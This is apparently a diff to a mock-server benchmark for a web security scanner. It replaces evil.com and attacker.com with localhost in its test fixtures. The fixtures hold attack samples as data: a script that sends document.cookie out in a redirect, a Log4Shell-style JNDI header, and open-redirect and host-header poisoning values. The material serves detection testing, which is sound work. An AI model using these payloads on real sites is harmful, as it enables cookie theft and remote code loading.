@@ -2,8 +2,7 @@ const http = require('http');
 const fs = require('fs');
 
 const MOCK_PORT = 9001;
-const LIMMA_API = "http://localhost:8900/master-report"; 
-
+const LIMMA_API = "http://127.0.0.1:8900/master-report";
 // =========================================================================
 // GROUND TRUTH DATA: V2 Massive Comprehensive Benchmark Suite
 // Extends tests from standard headers to CMS fingerprinting and Edge Cases!
@@ -664,7 +663,7 @@ const testCases = [
             status: 302,
             headers: {
                 "Content-Type": "text/html",
-                "Location": "https://evil.com/phishing",
+                "Location": "http://127.0.0.1:9002/phishing",
                 "X-Frame-Options": "DENY"
             },
             body: '<html><body>Redirecting...</body></html>'
@@ -681,7 +680,7 @@ const testCases = [
                 "Content-Type": "text/html",
                 "X-Frame-Options": "DENY"
             },
-            body: '<html><body><script>window.location = "https://evil.com?callback=" + document.cookie</script>Client-side redirect vulnerability</body></html>'
+            body: '<html><body><script>window.location = "http://127.0.0.1:9002?callback=" + document.cookie</script>Client-side redirect vulnerability</body></html>'
         }
     },
     {
@@ -725,7 +724,7 @@ const testCases = [
             status: 200,
             headers: {
                 "Content-Type": "text/html",
-                "X-Logging-Format": "${jndi:ldap://attacker.com/exploit}"
+                "X-Logging-Format": "${jndi:ldap://127.0.0.1:9002/exploit}"
             },
             body: '<html><body>Log4Shell style JNDI injection pattern in header</body></html>'
         }
@@ -847,9 +846,9 @@ const testCases = [
             status: 200,
             headers: {
                 "Content-Type": "text/html",
-                "Location": "http://attacker.com/redirect",
-                "X-Generated-For": "attacker.com",
-                "X-Cache-Key": "http://attacker.com/vuln/host-header"
+                "Location": "http://127.0.0.1:9002/maliciousrect",
+                "X-Generated-For": "127.0.0.1:9002",
+                "X-Cache-Key": "http://127.0.0.1:9002/vuln/host-header"
             },
             body: '<html><body>Host header poisoning vulnerability indicators</body></html>'
         }
@@ -1197,7 +1196,7 @@ server.listen(MOCK_PORT, async () => {
         const targetUrl = `http://localhost:${MOCK_PORT}${tc.path}`;
         process.stdout.write(`[${tc.category.padEnd(25)}] ${tc.id.padEnd(30)} -> `);
         
-        await new Promise(resolve => setTimeout(resolve, 200));
+        await new Promise(resolve => setTimeout(resolve, 2000));
 
         let engineOutcome = "";
         let detectedRiskTitles = "";
